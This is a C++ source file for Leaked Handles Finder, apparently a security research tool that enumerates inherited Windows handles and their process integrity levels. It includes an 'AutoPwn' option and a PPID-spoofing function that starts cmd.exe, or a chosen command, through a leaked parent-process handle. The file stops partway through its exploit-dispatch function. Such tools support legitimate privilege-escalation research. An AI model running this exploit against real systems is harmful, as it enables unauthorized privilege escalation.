/*
 * Leaked Handles Finder (LHF) -
 *
 * Copyright (C) 2021 @ramado78 for lab52.io
 *
 * This file is part of Leaked Handles Finder.
 *
 * LHF is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * LHF is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with LHF.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <unordered_set>
#include "Native.h"
#include "Lhf.h"
#include <shlwapi.h>
#include <psapi.h>

#pragma comment(lib, "Shlwapi.lib")
using namespace std;

//Global conf
CONFIG conf = {FALSE, FALSE, FALSE, NULL, NULL, NULL, FALSE};

 /// <summary>
 /// Obtains all system handles
 /// </summary>
 /// <param name="handles">System handle structure</param>
 /// <returns>NTSTATUS codes, 0 ok, !=0 error</returns>
 NTSTATUS GetAllSystemHandlers(_Out_ PSYSTEM_HANDLE_INFORMATION_EX * handles) {
    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION_EX handleInfoEx;
    ULONG handleInfoSizeEx = 0x10000;

    handleInfoEx = (PSYSTEM_HANDLE_INFORMATION_EX) malloc(handleInfoSizeEx);

    while ((status = NtQuerySystemInformation(
        SystemExtendedHandleInformation,
        handleInfoEx,
        handleInfoSizeEx,
        NULL
    )) == STATUS_INFO_LENGTH_MISMATCH) {
        handleInfoEx = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(handleInfoEx, handleInfoSizeEx *= 2);
        if (handleInfoEx == NULL)
            break; 
    }

    if (!NT_SUCCESS(status) || handleInfoEx == NULL)
    {
        _tprintf(_T("   [-] NtQuerySystemInformation failed!\n"));     
        *handles = NULL;
        free(handleInfoEx);
    }
    else {
        *handles =  handleInfoEx;
    }

    return status;
}

 /// <summary>
 /// Total number of handles
 /// </summary>
 /// <param name="systemHandlesList">System handle structure</param>
 /// <returns>Number of handles</returns>
 size_t IhCount(_In_ PSYSTEM_HANDLE_INFORMATION_EX systemHandlesList) {
     size_t count = 0;

     
     for (int i = 0; i < systemHandlesList->NumberOfHandles; i++)
     {
         PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleInfo = &systemHandlesList->Handles[i];
         if (handleInfo->HandleAttributes & (HANDLE_INHERIT)) {
             count++;
         }
     }

     return count;
 }

 /// <summary>
/// Ntdll process basic information query
/// </summary>
/// <param name="ProcessHandle">Process handle</param>
/// <param name="BasicInformation">Output structure</param>
/// <returns>NTSTATUS codes, 0 ok, !=0 error</returns>
 NTSTATUS GetProcessBasicInformation(_In_ HANDLE ProcessHandle,
                                     _Out_ PPROCESS_BASIC_INFORMATION BasicInformation)
 {
     return NtQueryInformationProcess(
         ProcessHandle,
         ProcessBasicInformation,
         BasicInformation,
         sizeof(PROCESS_BASIC_INFORMATION),
         NULL
     );
 }
 /// <summary>
 /// Ntdll thread basic information query
 /// </summary>
 /// <param name="ThreadHandle">Thread handle</param>
 /// <param name="BasicInformation">Output structure</param>
 /// <returns>NTSTATUS codes, 0 ok, !=0 error</returns>
 NTSTATUS GetThreadBasicInformation(_In_ HANDLE ThreadHandle,
                                    _Out_ PTHREAD_BASIC_INFORMATION BasicInformation)
 {
     return NtQueryInformationThread(
         ThreadHandle,
         ThreadBasicInformation,
         BasicInformation,
         sizeof(THREAD_BASIC_INFORMATION),
         NULL
     );
 }
 /// <summary>
 /// Gets handle name using new thread
 /// </summary>
 /// <param name="lp">Parameters</param>
 /// <returns>0 Success, 1 error</returns>
 DWORD GetObjectNameThread(LPVOID lp) {
     ULONG returnLength;
     GetObjectNameThreadStructParams* pGetObjectNameThreadParams = NULL;

     // getting  parameters
     pGetObjectNameThreadParams = (GetObjectNameThreadStructParams*)lp;
     
     pGetObjectNameThreadParams->objectNameInfo = malloc(0x1000);

     if (!NT_SUCCESS(NtQueryObject(
         pGetObjectNameThreadParams->hObject,
         ObjectNameInformation,
         pGetObjectNameThreadParams->objectNameInfo,
         0x1000,
         &returnLength
     )))
     {
         // Reallocate the buffer and try again. 
         pGetObjectNameThreadParams->objectNameInfo = realloc(pGetObjectNameThreadParams->objectNameInfo, returnLength);
         if (!NT_SUCCESS(NtQueryObject(
             pGetObjectNameThreadParams->hObject,
             ObjectNameInformation,
             pGetObjectNameThreadParams->objectNameInfo,
             returnLength,
             NULL
         )))
         {
             //Error
             free(pGetObjectNameThreadParams->objectNameInfo);
             return 1;
         }
     }
     return 0;
     
 }

 /// <summary>
 /// This function sets handle Name string
 /// </summary>
 /// <param name="DupHandle">Object real handle</param>
 /// <param name="TypeName"> Type name</param>
 /// <param name="GrantedAccess">Access mask</param>
 /// <param name="FormatedObjectName">Final object name string</param>
 /// <param name="RemoteProcessId">(Case thread/process) process id belonging to leaked handle</param>
 /// <returns>TRUE Success, FALSE error</returns>
 BOOL FormatObjectName(_In_ HANDLE DupHandle,
                       _In_ LPTSTR TypeName,
                       _In_ ULONG GrantedAccess,
                       _Out_ LPTSTR* FormatedObjectName,
                       _Out_ ULONG_PTR* RemoteProcessId)
 {
     //GetObjectNameThreadStructParams GetObjectNameThreadParams;
     //DWORD threadExitCode = 0;
    // DWORD threadID = 0;
     //HANDLE hThread = NULL;

     PVOID objectNameInfo;
     UNICODE_STRING objectName;
     ULONG returnLength;

     //_tprintf(_T("[%#x] Abriendo!\n"), GrantedAccess);
     /* Query the object name (unless it has an access of
           0x0012019f, on which NtQueryObject could hang. */ 
     if (
         GrantedAccess == 0x0012019f ||
         GrantedAccess == 0x1A019F ||
         GrantedAccess == 0x1048576f ||
         GrantedAccess == 0x120189
         )
     {

         //*FormatedObjectName = new TCHAR[10];
         _tcscpy_s(*FormatedObjectName, PTR_STR_LEN, _T(""));

         return FALSE;
     }

     objectNameInfo = malloc(0x1000);
     if (!NT_SUCCESS(NtQueryObject(
         DupHandle,
         ObjectNameInformation,
         objectNameInfo,
         0x1000,
         &returnLength
     )))
     {
         // Reallocate the buffer and try again. 
         objectNameInfo = realloc(objectNameInfo, returnLength);
         if (!NT_SUCCESS(NtQueryObject(
             DupHandle,
             ObjectNameInformation,
             objectNameInfo,
             returnLength,
             NULL
         )))
         {
             // We have the type name, so just display that.
             free(objectNameInfo);
             return FALSE;
         }
     }
     
     /*

     if (
         GrantedAccess == 0x0012019f ||
         GrantedAccess == 0x1A019F ||
         GrantedAccess == 0x1048576f ||
         GrantedAccess == 0x120189
         )
     {
         // get the object name of the current handle, doing this in a new thread to avoid deadlocks
         memset((void*)&GetObjectNameThreadParams, 0, sizeof(GetObjectNameThreadStructParams));
         GetObjectNameThreadParams.hObject = DupHandle;
         hThread = CreateThread(NULL, 0, GetObjectNameThread, (void*)&GetObjectNameThreadParams, 0, &threadID);

         // Can't create thread so return no name  
         if (hThread == NULL)
         {
             _tcscpy_s(*FormatedObjectName, PTR_STR_LEN, _T("No name1"));
             return FALSE;
         }

         // wait for thread to finish (100 milisecond timeout)
         if (WaitForSingleObject(hThread, 100) != WAIT_OBJECT_0)
         {
             // time-out kill thread
             TerminateThread(hThread, 1);
             CloseHandle(hThread);
             free(GetObjectNameThreadParams.objectNameInfo);

             _tcscpy_s(*FormatedObjectName, PTR_STR_LEN, _T("No name2"));
             return FALSE;
         }

         // check exit code of temporary thread
         GetExitCodeThread(hThread, &threadExitCode);
         if (threadExitCode != 0)
         {
             // failed
             CloseHandle(hThread);
             _tcscpy_s(*FormatedObjectName, PTR_STR_LEN, _T("No name3"));
             return FALSE;
         }

         // close thread handle
         CloseHandle(hThread);


     }
     else {

         GetObjectNameThreadParams.objectNameInfo = malloc(0x1000);
         if (!NT_SUCCESS(NtQueryObject(
             DupHandle,
             ObjectNameInformation,
             GetObjectNameThreadParams.objectNameInfo,
             0x1000,
             &returnLength
         )))
         {
             // Reallocate the buffer and try again. 
             GetObjectNameThreadParams.objectNameInfo = realloc(GetObjectNameThreadParams.objectNameInfo, returnLength);
             if (!NT_SUCCESS(NtQueryObject(
                 DupHandle,
                 ObjectNameInformation,
                 GetObjectNameThreadParams.objectNameInfo,
                 returnLength,
                 NULL
             )))
             {
                 // We have the type name, so just display that.
                 free(GetObjectNameThreadParams.objectNameInfo);
                 return FALSE;
             }
         }

     }
     */
     


     /*--------------*/

     // Cast our buffer into an UNICODE_STRING
     //objectName = *(PUNICODE_STRING)GetObjectNameThreadParams.objectNameInfo;
     objectName = *(PUNICODE_STRING)objectNameInfo;

     // The object has a name
     if (objectName.Length)
     {
         // free default string
         delete[] *FormatedObjectName;
         *FormatedObjectName = new TCHAR[objectName.Length];
         _tcscpy_s(*FormatedObjectName, objectName.Length, objectName.Buffer);

     }

     //free(GetObjectNameThreadParams.objectNameInfo);
     free(objectNameInfo);

     if (_tcscmp(TypeName, _T("Process")) == 0) {        
         PROCESS_BASIC_INFORMATION pbasicInfo;

         if (!NT_SUCCESS(GetProcessBasicInformation(DupHandle, &pbasicInfo)))
             return FALSE;

         delete[] *FormatedObjectName;
         *FormatedObjectName = new TCHAR[400];

         _stprintf_s(*FormatedObjectName, 400, _T("HandleProcessPid(%llu)"), (ULONG_PTR)pbasicInfo.UniqueProcessId);
         *RemoteProcessId = (ULONG_PTR)pbasicInfo.UniqueProcessId;
     }
     else if (_tcscmp(TypeName, _T("Thread")) == 0) {
         THREAD_BASIC_INFORMATION tbasicInfo;

         if (!NT_SUCCESS(GetThreadBasicInformation(DupHandle, &tbasicInfo)))
             return FALSE;

         delete[] *FormatedObjectName;
         *FormatedObjectName = new TCHAR[400];

         _stprintf_s(*FormatedObjectName, 400, _T("HandleProcessPid(%llu) ThreadId(%llu)"),
                    (ULONG_PTR)tbasicInfo.ClientId.UniqueProcess,
                    (ULONG_PTR)tbasicInfo.ClientId.UniqueThread);
         *RemoteProcessId = (ULONG_PTR)tbasicInfo.ClientId.UniqueProcess;

     }


     return TRUE;
 }

 /// <summary>
 /// This function sets handle Type and Name strings 
 /// </summary>
 /// <param name="lhfHhandle"></param>
 /// <returns>TRUE Success, FALSE error</returns>
 BOOL SetHandleStrings(_Out_ LHF_PHANDLE_DESCRIPTION lhfHhandle) {
     HANDLE processHandle;
     HANDLE dupHandle = NULL;
     POBJECT_TYPE_INFORMATION objectTypeInfo;



     // Setting default Handle type name
     lhfHhandle->TypeString = new TCHAR[PTR_STR_LEN];
     _tcscpy_s(lhfHhandle->TypeString, PTR_STR_LEN, _T(""));

     lhfHhandle->Name = new TCHAR[PTR_STR_LEN];
     _tcscpy_s(lhfHhandle->Name, PTR_STR_LEN, _T(""));

     if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE|PROCESS_QUERY_INFORMATION, FALSE, lhfHhandle->UniqueProcessId)))
     {
         return FALSE;
     }


     // Duplicate the handle so we can query it
     if (!NT_SUCCESS(NtDuplicateObject(
         processHandle,
         (HANDLE)lhfHhandle->Handle,
         GetCurrentProcess(),
         &dupHandle,
         0,
         0,
         DUPLICATE_SAME_ACCESS
     )))
     {
         CloseHandle(processHandle);
         return FALSE;
     }

     CloseHandle(processHandle);

     // Query the object type
     objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
     if (!NT_SUCCESS(NtQueryObject(
         dupHandle,
         ObjectTypeInformation,
         objectTypeInfo,
         0x1000,
         NULL
     )))
     {
         _tprintf(_T("   [%#x] NtQueryObject!\n"), lhfHhandle->Handle);
         CloseHandle(dupHandle);
         free(objectTypeInfo);
         return FALSE;
     }

     // Setting Handle type name
     _tcscpy_s(lhfHhandle->TypeString,
               PTR_STR_LEN,
               objectTypeInfo->Name.Buffer);

     free(objectTypeInfo);


     FormatObjectName(dupHandle,
                      lhfHhandle->TypeString,
                      lhfHhandle->GrantedAccess,
                      &(lhfHhandle->Name),
                      &(lhfHhandle->RemoteProcessId));

     
     CloseHandle(dupHandle);
     return TRUE;
 }

 /// <summary>
 /// Get process intergrity from a process id
 /// </summary>
 /// <param name="UniqueProcessId"> Process Id</param>
 /// <param name="integrityCode">Integrity code number</param>
 /// <param name="integrityStr">Integrity common name</param>
 /// <returns>TRUE Success, FALSE error</returns>
 BOOL GetPidIntegrity(_In_ ULONG_PTR UniqueProcessId,
                      _Out_ IntegrityLevel * integrityCode,
                      _Out_ LPTSTR * integrityStr) {
     HANDLE hToken = NULL;
     DWORD tokenInfoLength = 0;
     LPTSTR fileNameBuffer = new TCHAR[MAX_PATH];
     LPTSTR pathFileName = fileNameBuffer;

     // Setting default Handle type name
     *integrityCode = INTEGRITY_UNKNOWN;
     *integrityStr = new TCHAR[PTR_STR_LEN + MAX_PATH];
     _tcscpy_s(*integrityStr, PTR_STR_LEN + MAX_PATH , _T("INTEGRITY_UNKNOWN "));
     
     SetLastError(NULL);
     HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, UniqueProcessId);
     
     if (processHandle == NULL) {       
         delete [] fileNameBuffer;
         return FALSE;
     }

     //Get process image name
     if (!GetModuleFileNameEx((HMODULE)processHandle, NULL, fileNameBuffer, MAX_PATH)) {
         _tcscpy_s(pathFileName, MAX_PATH, _T(""));
     }
     else
         pathFileName = PathFindFileName(pathFileName);
     lstrcat(*integrityStr, pathFileName);

     bool getToken = OpenProcessToken(processHandle, TOKEN_QUERY, &hToken);

     if (getToken == 0){
        delete[] fileNameBuffer;
        CloseHandle(processHandle);
        return FALSE;
     }

     if (GetTokenInformation(hToken, TokenIntegrityLevel,
         NULL, 0, &tokenInfoLength) ||
         ::GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
         CloseHandle(processHandle);
         CloseHandle(hToken);
         delete[] fileNameBuffer;
         return FALSE;
     }

     TOKEN_MANDATORY_LABEL* tokenLabel = (TOKEN_MANDATORY_LABEL*)malloc(tokenInfoLength);

     if (!GetTokenInformation(hToken, TokenIntegrityLevel,
         tokenLabel, tokenInfoLength, &tokenInfoLength))
     {
         CloseHandle(processHandle);
         CloseHandle(hToken);
         free(tokenLabel);
         delete[] fileNameBuffer;
         return FALSE;
     }

     DWORD integrityLevel = *GetSidSubAuthority(tokenLabel->Label.Sid,
         (DWORD)(UCHAR)(*GetSidSubAuthorityCount(tokenLabel->Label.Sid) - 1));

     CloseHandle(processHandle);
     CloseHandle(hToken);
     free(tokenLabel);

     if (integrityLevel < SECURITY_MANDATORY_LOW_RID) {
         _tcscpy_s(*integrityStr, PTR_STR_LEN + MAX_PATH, _T("UNTRUSTED_INTEGRITY "));
         *integrityCode = UNTRUSTED_INTEGRITY;
         lstrcat(*integrityStr, pathFileName);
         delete[] fileNameBuffer;
         return TRUE;
     }
     if (integrityLevel < SECURITY_MANDATORY_MEDIUM_RID) {
         _tcscpy_s(*integrityStr, PTR_STR_LEN + MAX_PATH, _T("LOW_INTEGRITY "));
         *integrityCode = LOW_INTEGRITY;
         lstrcat(*integrityStr, pathFileName);
         delete[] fileNameBuffer;
         return TRUE;
     }

     if (integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
         integrityLevel < SECURITY_MANDATORY_HIGH_RID) {
         _tcscpy_s(*integrityStr, PTR_STR_LEN + MAX_PATH, _T("MEDIUM_INTEGRITY "));
         *integrityCode = MEDIUM_INTEGRITY;
         lstrcat(*integrityStr, pathFileName);
         delete[] fileNameBuffer;
         return TRUE;
     }

     if (integrityLevel < SECURITY_MANDATORY_SYSTEM_RID) {
         _tcscpy_s(*integrityStr, PTR_STR_LEN + MAX_PATH, _T("HIGH_INTEGRITY "));
         *integrityCode = HIGH_INTEGRITY;
         lstrcat(*integrityStr, pathFileName);
         delete[] fileNameBuffer;
         return TRUE;
     }

     if (integrityLevel < SECURITY_MANDATORY_PROTECTED_PROCESS_RID) {
         _tcscpy_s(*integrityStr, PTR_STR_LEN + MAX_PATH, _T("SYSTEM_INTEGRITY "));
         *integrityCode = SYSTEM_INTEGRITY;
         lstrcat(*integrityStr, pathFileName);
         delete[] fileNameBuffer;
         return TRUE;
     }

     if (integrityLevel >= SECURITY_MANDATORY_PROTECTED_PROCESS_RID) {
         _tcscpy_s(*integrityStr, PTR_STR_LEN + MAX_PATH, _T("PPL_INTEGRITY "));
         *integrityCode = PPL_INTEGRITY;
         lstrcat(*integrityStr, pathFileName);
         delete[] fileNameBuffer;
         return TRUE;
     }

     delete[] fileNameBuffer;
     return FALSE;
 }
 /// <summary>
 /// Returns parent process id from a provided process id
 /// </summary>
 /// <param name="pid">Current process ID</param>
 /// <param name="ppid">Parent process ID</param>
 /// <returns>TRUE Success, FALSE error</returns>
 BOOL GetParentPid(_In_ ULONG_PTR pid, 
                   _Out_ PULONG_PTR ppid) {
     ULONG returnLength = 0;
     ULONG status = 0;
     ULONG ProcessInfoSizeEx = sizeof(PROCESS_BASIC_INFORMATION);

     HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);

     if (processHandle == NULL) {
         return FALSE;
     }

     PVOID ProcessInformation = malloc(ProcessInfoSizeEx);

     while ((status = NtQueryInformationProcess(
         processHandle,
         ProcessBasicInformation,
         ProcessInformation,
         ProcessInfoSizeEx,
         &returnLength
     )) == STATUS_INFO_LENGTH_MISMATCH) {
         ProcessInformation = realloc(ProcessInformation, ProcessInfoSizeEx *= 2);
         if (ProcessInformation == NULL)
             break;
     }

     if (!NT_SUCCESS(status) || ProcessInformation == NULL)
     {
         _tprintf(_T("   [-] NtQueryInformationProcess failed!\n"));
         free(ProcessInformation);
         CloseHandle(processHandle);
         return FALSE;
     }

     PPROCESS_BASIC_INFORMATION pbi = (PPROCESS_BASIC_INFORMATION)ProcessInformation;
     *ppid = (ULONG_PTR) pbi->InheritedFromUniqueProcessId;
     free(ProcessInformation);
     CloseHandle(processHandle);

     return TRUE;
 }

 /// <summary>
 /// This functions reads all system handles and set up LHF own structure 
 /// </summary>
 /// <param name="systemHandlesList">System (ntdll) provided handles list</param>
 /// <param name="lhfHandles">LHF handles own structure</param>
 /// <returns>TRUE Success, FALSE error</returns>
 BOOL GetLhfHandles(_In_ PSYSTEM_HANDLE_INFORMATION_EX systemHandlesList,
                    _Out_ LHF_PHANDLE_DESCRIPTION_LIST * lhfHandles) {
     size_t handleIndex = 0;

     *lhfHandles = (LHF_PHANDLE_DESCRIPTION_LIST)malloc(sizeof(LHF_HANDLE_DESCRIPTION_LIST));

     // Getting unmber of inherited handles
     (*lhfHandles)->NumberOfLhfHandles = IhCount(systemHandlesList);

     // There´s no interesting handles 
     if ((*lhfHandles)->NumberOfLhfHandles == 0)
         return FALSE;

     // Allocating memory for our own lhf list of handles structure
     (*lhfHandles)->Handles = (LHF_PHANDLE_DESCRIPTION)malloc(sizeof(LHF_HANDLE_DESCRIPTION) * ((*lhfHandles)->NumberOfLhfHandles));

     for (int i = 0; i < systemHandlesList->NumberOfHandles; i++)
     {
         PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleInfo = &systemHandlesList->Handles[i];
         if (handleInfo->HandleAttributes & (HANDLE_INHERIT)) {

             // Case Process Handle: this is the handle of remote process inherited, default none.
             (*lhfHandles)->Handles[handleIndex].RemoteProcessId = -1;
             (*lhfHandles)->Handles[handleIndex].UniqueProcessId = handleInfo->UniqueProcessId;
             (*lhfHandles)->Handles[handleIndex].Handle = handleInfo->HandleValue;
             (*lhfHandles)->Handles[handleIndex].GrantedAccess = handleInfo->GrantedAccess;
             (*lhfHandles)->Handles[handleIndex].ObjectTypeIndex = handleInfo->ObjectTypeIndex;

             //(*lhfHandles)->Handles[handleIndex].GrantedAccessString;
             //https://github.com/processhacker/processhacker/blob/e96989fd396b28f71c080edc7be9e7256b5229d0/phlib/secdata.c

             SetHandleStrings(&((*lhfHandles)->Handles[handleIndex]));
             
             GetPidIntegrity((*lhfHandles)->Handles[handleIndex].UniqueProcessId,
                 &((*lhfHandles)->Handles[handleIndex].ProcessIntegrity),
                 &((*lhfHandles)->Handles[handleIndex].ProcessIntegrityString)
             );
             
             if (!GetParentPid((*lhfHandles)->Handles[handleIndex].UniqueProcessId,
                 &((*lhfHandles)->Handles[handleIndex].ParentUniqueProcessId)))
             {
                 (*lhfHandles)->Handles[handleIndex].ParentUniqueProcessId = -1;
             }
             
             GetPidIntegrity((*lhfHandles)->Handles[handleIndex].ParentUniqueProcessId,
                 &((*lhfHandles)->Handles[handleIndex].ParentProcessIntegrity),
                 &((*lhfHandles)->Handles[handleIndex].ParentProcessIntegrityString)
             );
             
             handleIndex++;
         }
     }
     return TRUE;
 }

 /// <summary>
 /// Cleaning function, freeing memory
 /// </summary>
 /// <param name="lhfHandles">LHF Handles list structure</param>
 void LhfFree(_In_ LHF_PHANDLE_DESCRIPTION_LIST lhfHandles) {

     if (lhfHandles == NULL) {
         return;
     }
     for (int i = 0; i < lhfHandles->NumberOfLhfHandles; i++)
     {
         //delete(lhfHandles->Handles[i].GrantedAccessString);
         delete [] lhfHandles->Handles[i].ProcessIntegrityString;
         delete [] lhfHandles->Handles[i].Name;
         delete [] lhfHandles->Handles[i].TypeString;
         delete [] lhfHandles->Handles[i].ParentProcessIntegrityString;
     }

     free(lhfHandles->Handles);
     free(lhfHandles);
 }

/// <summary>
/// Output to file, one line per record
/// </summary>
/// <param name="hd">Handle description own structure</param>
 void WritetoLogFile(_In_ LHF_HANDLE_DESCRIPTION hd) {
     SYSTEMTIME lt;
     FILE* logFile;
     errno_t err;

     GetLocalTime(&lt);
     if ((err = _tfopen_s(&logFile, conf.OutputFile, _T("a"))) == 0) {
         _ftprintf(logFile, _T("[%02d:%02d:%02d %02d-%02d-%d PID %d %s(PPID %d %s) ] Type: %s, Handle: %#x, Granted: %#x, Name: %s\n"),
             lt.wHour,
             lt.wMinute,
             lt.wSecond,
             lt.wDay,
             lt.wMonth,
             lt.wYear,
             hd.UniqueProcessId,
             hd.ProcessIntegrityString,
             hd.ParentUniqueProcessId,
             hd.ParentProcessIntegrityString,
             hd.TypeString,
             hd.Handle,
             hd.GrantedAccess,
             hd.Name);
         fclose(logFile);
     }
     else {
         _tprintf(_T("   [-]Error writing log file.\n"));
     }
 }

 /// <summary>
/// Console output print multiple line per record
/// </summary>
/// <param name="hd">Handle description own structure</param>
 void PrettyPrint(_In_ LHF_HANDLE_DESCRIPTION hd) {
     SYSTEMTIME lt;

     GetLocalTime(&lt);
     _tprintf(_T("==[PID %d %s]===================================================================\n"),
         hd.UniqueProcessId,
         hd.ProcessIntegrityString
         );
     _tprintf(_T("   Date             : %02d:%02d:%02d %02d-%02d-%d\n"),
         lt.wHour,
         lt.wMinute,
         lt.wSecond,
         lt.wDay,
         lt.wMonth,
         lt.wYear);
     _tprintf(_T("   Handle type      : %s (%#x)\n"), hd.TypeString, hd.Handle);
     _tprintf(_T("   Parent process Id: %d %s\n"), hd.ParentUniqueProcessId, hd.ParentProcessIntegrityString); 
     _tprintf(_T("   Granted access   : %#x\n"), hd.GrantedAccess);
     _tprintf(_T("   Name             : %s\n"), hd.Name);

     if (hd.HExploitability == EXPLOITABLE)
         _tprintf(_T("   Exploitability   : %s\n"), STR_EXPLOITABLE);
     if (hd.HExploitability == EXPLOITABLE_BUT_NOT_SUPPORTED)
         _tprintf(_T("   Exploitability   : %s\n"), STR_EXPLOITABLE_BUT_NOT_SUPPORTED);
     if (hd.HExploitability == RESEARCH_NEEDED)
         _tprintf(_T("   Exploitability   : %s\n"), STR_RESEARCH_NEEDED);
     if (hd.HExploitability == NON_EXPLOITABLE)
         _tprintf(_T("   Exploitability   : %s\n"), STR_NON_EXPLOITABLE);

     if (conf.OutputFile != NULL) {
         WritetoLogFile(hd);
     }
 }

 /// <summary>
 /// Console output print one line per record
 /// </summary>
 /// <param name="hd">Handle description own structure</param>
 void SingleLinePrint(_In_ LHF_HANDLE_DESCRIPTION hd) {
     SYSTEMTIME lt;

     GetLocalTime(&lt);
     _tprintf(_T("[%02d:%02d:%02d %02d-%02d-%d PID %d %s (PPID %d %s)] Type: %s, Handle: %#x, Granted: %#x, Name: %s\n"),
         lt.wHour,
         lt.wMinute,
         lt.wSecond,
         lt.wDay,
         lt.wMonth,
         lt.wYear,
         hd.UniqueProcessId,
         hd.ProcessIntegrityString,
         hd.ParentUniqueProcessId,
         hd.ParentProcessIntegrityString,
         hd.TypeString,
         hd.Handle,
         hd.GrantedAccess,
         hd.Name);

     if (conf.OutputFile != NULL) {
         WritetoLogFile(hd);
     }
 }

 /// <summary>
 /// Suspend an arbitrary process
 /// </summary>
 /// <param name="pid">Process Id</param>
 /// <returns>TRUE Success, FALSE error</returns>
 BOOL SuspendProcessByPid(_In_ ULONG pid) {
     HANDLE processHandle;

     if (!(processHandle = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid)))
     {
         _tprintf(_T("   [-] Could not open PID %d for suspend!\n"), pid);
         return FALSE;
     }

     NtSuspendProcess(processHandle);
     CloseHandle(processHandle);
     return TRUE;
 }

 /// <summary>
 /// Function for generating a uniq handle identifier
 /// </summary>
 /// <param name="hd">Handle description own structure</param>
 /// <returns>Handle uniq id</returns>
 ULONG_PTR GetUniqHandleId(_In_ LHF_HANDLE_DESCRIPTION hd) {
 
     return hd.ObjectTypeIndex +
            hd.GrantedAccess +
            hd.Handle +
            hd.UniqueProcessId +
            hd.ParentProcessIntegrity +
            hd.ProcessIntegrity;
 }

 /// <summary>
 /// Help banner
 /// </summary>
 /// <param name="ProgramName">Binary image file name</param>
 void Usage(TCHAR* ProgramName)
 {

    _tprintf(_T(" __       __    __   _______\n"));
    _tprintf(_T("|  |     |  |  |  | |   ____|\n"));
    _tprintf(_T("|  |     |  |__|  | |  |__\n"));
    _tprintf(_T("|  |     |   __   | |   __|\n"));
    _tprintf(_T("|  `----.|  |  |  | |  |\n"));
    _tprintf(_T("|_______||__|  |__| |__|\n"));
    _tprintf(_T("==[Leaked Handles Finder v1.0 by @ramado78 from lab52.io]==================================\n"));
    _tprintf(_T("   Usage                   :  %s [options]\n"), ProgramName);
    _tprintf(_T("==[Options]================================================================================\n"));
    _tprintf(_T("   -o<file>                : Write log to file\n"));
    _tprintf(_T("   -s<type>                : Suspend process when a handle type (Process, File...) is found\n"));
    _tprintf(_T("   -a                      : AutoPwn, try to exploit the handle\n"));
    _tprintf(_T("   -r                      : Research mode. Keep looking for leaked handles continuously\n"));
    _tprintf(_T("   -l                      : Print to stdout using single line\n"));
    _tprintf(_T("   -h                      : Show help\n"));
    _tprintf(_T("   -u                      : Hide unnamed handles\n"));
    _tprintf(_T("   -c<Exploit command>     : Command to execute (Case process parent pid explotation)\n"));
    _tprintf(_T("==[Examples]===============================================================================\n"));
    _tprintf(_T("   Loop execution research : LeakedHandlesFinder.exe -u -r -oLogFile.txt\n"));
    _tprintf(_T("   One execution autopwn   : LeakedHandlesFinder.exe -u -a\n"));

    exit(127);
 }

 /// <summary>
 /// Program configuration function, reads commandline ans sets global
 /// config variale. 
 /// </summary>
 /// <param name="argc">Main argc</param>
 /// <param name="argv">Main argv</param>
 /// <returns></returns>
 void SetConfig(_In_ int argc,
                _In_ TCHAR* argv[]) {

     //Deafult ExploitCommand
     conf.ExploitCommand = new TCHAR[MAX_PATH];
     _tcscpy_s(conf.ExploitCommand, MAX_PATH, _T("c:\\Windows\\System32\\cmd.exe"));

     while ((argc > 1) && (argv[1][0] == '-'))
     {
         switch (argv[1][1])
         {
         case 'o':
             conf.OutputFile = &argv[1][2];
             break;

         case 's':
             conf.SuspendType = &argv[1][2];
             break;

         case 'a':
             conf.AutoPwn = TRUE;
             break;

         case 'u':
             conf.HideUnnamedHandles = TRUE;
             break;

         case 'r':
             conf.ResearchMode = TRUE;
             break;

         case 'l':
             conf.SingleLine = TRUE;
             break;

         case 'c':
             _tcscpy_s(conf.ExploitCommand, MAX_PATH, &argv[1][2]);
             break;

         case 'h':
             Usage(argv[0]);
             exit(0);
             break;

         default:
             _tprintf(_T("Wrong Argument: %s\n"), argv[1]);
             Usage(argv[0]);
         }

         ++argv;
         --argc;
     }
 
 }

 /// <summary>
 /// PPID spoofing exploit technic, useful when we get PROCESS_CREATE_PROCESS priv.
 /// even if the parent process already died.
 /// </summary>
 /// <param name="parentHandle">Leaked parent handle</param>
 /// <param name="command">Path to an executable</param>
 /// <returns></returns>
 BOOL ExploitProcessPpidSpoofing(_In_ HANDLE parentHandle,
                                 _In_ LPTSTR command) {
     STARTUPINFOEX si;
     PROCESS_INFORMATION pi;
     SIZE_T attributeSize;
     ZeroMemory(&si, sizeof(STARTUPINFOEX));


     InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
     si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
     InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
     UpdateProcThreadAttribute(si.lpAttributeList,
                               0,
                               PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                               &parentHandle, sizeof(HANDLE), NULL, NULL);
     si.StartupInfo.cb = sizeof(STARTUPINFOEX);

     BOOL res = CreateProcess(NULL, command, NULL, NULL, FALSE,
                              EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                              NULL, NULL, &si.StartupInfo, &pi);
     
     //debugg
     if (res == FALSE)
         _tprintf(_T("   [-] PPID Spoofing CreateProcess Error: %d\n"), GetLastError());
     else
         _tprintf(_T("   [+] Created process with PID %d\n"), pi.dwProcessId);


     return res;
 }

 /// <summary>
 /// Exploit process generic function, it decides which exploit strategy to use.
 /// </summary>
 /// <param name="lhfHandle">LHF own structure</param>
 /// <returns>TRUE means Success</returns>
 BOOL TryToExploit(_In_ LHF_HANDLE_DESCRIPTION lhfHandle) {
     HANDLE processHandle;
